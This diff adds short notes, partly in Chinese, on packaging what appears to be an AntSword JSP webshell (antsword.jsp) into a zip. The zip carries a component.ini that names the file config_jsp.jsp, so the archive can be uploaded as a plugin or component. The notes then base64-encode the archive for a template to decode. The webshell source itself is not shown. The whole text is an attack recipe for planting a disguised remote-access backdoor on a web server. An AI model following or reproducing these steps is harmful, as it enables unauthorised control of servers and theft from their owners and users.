@@ -1,0 +1,11 @@
+component.ini
+里面的内容包括
+id=Wiop
+name=config_jsp.jsp
+thumb=/test
+
+
+zip 1.zip component.ini antsword.jsp
+cat 1.zip|base64
+
+模版用 base64_decode 解码即可
